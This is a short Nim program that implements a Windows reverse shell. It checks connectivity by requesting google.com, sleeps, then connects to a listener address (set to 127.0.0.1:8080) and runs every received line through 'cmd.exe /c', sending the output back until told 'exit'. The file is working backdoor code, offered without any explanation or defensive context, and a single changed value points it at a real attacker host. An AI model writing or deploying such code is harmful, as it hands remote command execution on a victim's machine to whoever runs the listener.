import osproc, os
import net, httpclient

var
  Lip = "127.0.0.1"
  Lport = Port(8080)
  socket = newSocket()
  client = newHttpClient()
  response: Response = nil



response = client.request("https://www.google.com", httpMethod = HttpGet)
if response.status == "200 OK":
  sleep(5000)
  try:
    socket.connect(Lip, Lport)
    while true:
      let cmd = socket.recvLine()
      if cmd == "exit":
        break
      let result = execProcess("cmd.exe /c " & cmd)
      socket.send(result)
  except:
      raise
  finally:
      socket.close
else:
  echo response.status

